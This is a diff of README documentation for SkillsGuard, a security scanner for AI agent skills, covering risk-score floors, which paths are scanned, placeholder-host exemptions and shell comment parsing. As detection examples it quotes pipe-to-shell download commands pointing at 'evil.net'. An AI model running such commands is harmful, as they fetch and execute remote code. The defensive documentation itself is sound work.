@@ -188,7 +188,7 @@ SkillSpector is the most architecturally similar project — same "scan before i
 | Git diff / staged-files mode | Yes — `--diff`, `--staged` | Not part of the documented workflow |
 | SARIF output | Yes | Yes |
 | MCP server | Yes — `scan_skill`, `scan_skills_dir`, teachable `SKILL.md` | Not applicable (LangGraph-based pipeline) |
-| Maturity (as of this writing) | v1.1.1 | v2.0.0, 5.5k+ GitHub stars, published paper |
+| Maturity (as of this writing) | v1.2.0 | v2.0.0, 5.5k+ GitHub stars, published paper |
 
 **Honest take:** SkillSpector has more research weight behind it and an LLM semantic stage that catches intent-level issues regex can't — e.g. a skill that *says* it formats code but quietly also reads `~/.ssh`. If that extra layer of reasoning matters more to you than staying dependency-free, it's a strong choice. Worth scanning the same skill with both and comparing findings rather than picking one blind.
 
@@ -611,7 +611,8 @@ Options:
   --json              Emit JSON output (for CI / piping to other tools)
   --sarif             Emit SARIF 2.1.0 output (GitHub Code Scanning)
   --no-color          Disable ANSI color codes
-  --min-severity      Filter findings below this level (default: INFO)
+  --min-severity      Filter findings below this level (default: INFO);
+                      "not analyzed" findings are never filtered
                       Values: CRITICAL HIGH MEDIUM LOW INFO
   --exit-zero         Exit 0 even when findings exist (CI report mode)
   --max-risk <n>      Exit 1 if risk score exceeds n [0-100] (e.g. --max-risk 40)
@@ -645,7 +646,7 @@ Subcommands:
   server [port]        Start the local HTTP server (same as --server)
 
 Exit codes:
-  0   No findings at or above --min-severity
+  0   No findings at or above --min-severity (a file that could not be analyzed always counts as a finding)
   1   One or more findings found
   2   Usage error / target not found
 ```
@@ -777,7 +778,7 @@ Min severity: INFO · Ctrl+C to stop
 [14:05:02] ✓ 1 finding(s) resolved
 ```
 
-File-system events are debounced (300ms default) and hidden/build directories (`node_modules`, `dist`, `build`, dotfiles) are ignored automatically. Press `Ctrl+C` to stop.
+File-system events are debounced (300ms default). Only `.git` and `.skillsguard` are ignored, because the scanner never reads them either; a change in `dist`, `build`, `node_modules` or any hidden directory triggers a re-scan, since the scanner scans or reports those too. Press `Ctrl+C` to stop.
 
 ---
 
@@ -1331,6 +1332,29 @@ SkillsGuard computes a **Risk Score** from `0` to `100` for every scan, summariz
   - `11 - 30`: `MEDIUM`
   - `31 - 60`: `HIGH`
   - `> 60`: `CRITICAL`
+- **Unreviewed content raises a floor.** A file or directory SkillsGuard could not analyze proves nothing about safety, so it is never scored as low risk. That covers a file over the 8 MB scan limit, an unreadable file, bytecode too large to inspect, a native module (`SG-NATIVE-001`), and a dependency or environment tree that holds executable code (`SG-SKIP-002`). Each such finding holds the score at the midpoint of the band for its severity: `HIGH` → 45, `CRITICAL` → 80, `MEDIUM` → 20, `LOW` → 5. The floor only lifts the score; it is not added to real detections. It follows `severityOverrides`, and `ignoreRules` removes it.
+
+### What is scanned, and what is reported instead
+A file name or a directory name never decides that content is safe, so nothing is skipped silently except `.git` and `.skillsguard`.
+
+| Content | Behavior |
+|---|---|
+| `dist`, `build`, `__pycache__` and every other ordinary directory | Scanned like any other path |
+| `.pyc` / `.pyo` bytecode | Always inspected: `SG-BYTECODE-001` (HIGH), `SG-BYTECODE-002` (CRITICAL, unchecked-hash) |
+| Text files over 512 KB, up to 8 MB | Scanned in overlapping chunks |
+| Files over 8 MB, or over 512 KB with more than 524,288 lines | Not analyzed; `SG-SKIP-001` (HIGH, unanalyzed). The line limit keeps a file of blank lines from taking minutes to scan |
+| Native modules: ELF, PE, Mach-O, wasm, `.so`, `.pyd`, `.dll`, `.dylib`, `.node`, `.wasm`, `.exe` | `SG-NATIVE-001` (HIGH, unanalyzed). Detected by the first bytes of the file, not by its name |
+| Extensionless scripts with a `#!` line | Scanned |
+| `node_modules`, `venv`, `.venv`, `env`, `.tox`, `target`, `.cargo`, `.next`, `.open-next`, `.wrangler` and tool caches | Not scanned rule by rule. If one holds executable code you get one `SG-SKIP-002` (HIGH, unanalyzed) finding. A tree with only data is quiet |
+| `.git`, `.skillsguard` | Ignored |
+
+Unanalyzed findings survive `--min-severity`. To accept one on purpose, use `--exclude <dir>` or `ignoreRules`.
+
+**Test and example paths.** Findings in documentation or data files (`.md`, `.txt`, `.rst`, `.json`, `.yaml`, `.yml`, `.csv`) under a path such as `tests/`, `examples/`, `fixtures/` or `demo/` are lowered to `INFO`, because those files show commands without running them. Code under the same paths (`.sh`, `.py`, `.js`, extensionless scripts, and so on) keeps its full severity, since it runs exactly like code anywhere else. `CRITICAL` findings are never lowered.
+
+**Placeholders in documentation.** Some network, supply-chain, exfiltration and secret rules skip a match that is clearly an example, so `curl https://example.com/install.sh | bash` in a README stays quiet. The decision is about what the command does, not about words on the line: appending `# example` to a payload does not hide it. A URL is excused only when its host is reserved for documentation (`example.com`, `example.org`, `example.net`, `example.edu` and their subdomains, or anything under `.example` or `.invalid`) or is a template such as `<your-host>` or `{{host}}`. A placeholder word in the path, a trailing comment or another argument excuses nothing, nor does a real domain that only contains the word (`example.evil.net`). A host written as a number (`http://1234567890/`) is an address, not a placeholder. If a command contains a variable such as `$TOKEN` and no URL, it is never excused. Every match on a line has to be a placeholder for the line to stay quiet. To silence a legitimate example that does not use a reserved host, use `skillsguard-ignore: <RULE-ID>` or `ignoreRules`.
+
+**Comments in shell commands.** Many rules treat `#` as the end of a command, because the rest of the line is a comment. A shell does that only when `#` starts a word, so SkillsGuard does the same: `curl https://evil.net/p.sh#x | bash` (a URL fragment), `curl https://evil.net/p.sh\#x | bash` (an escaped `#`) and `curl "https://evil.net/p.sh #x" | bash` (a `#` inside quotes) are all reported as a pipe to a shell. SkillsGuard is not a shell parser, so it leans toward reporting: a `#` counts as a comment only if it starts a word, is not part of a PowerShell `<# ... #>` block, and no quote, backtick or `}` follows it on the line. The one visible side effect is that a real comment containing an apostrophe may no longer end the command, which can add a finding and never removes one. A command that starts inside a comment is still reported.
 
 ### CI gating
 You can instruct SkillsGuard to fail (exit `1`) if the risk score exceeds a specific threshold:
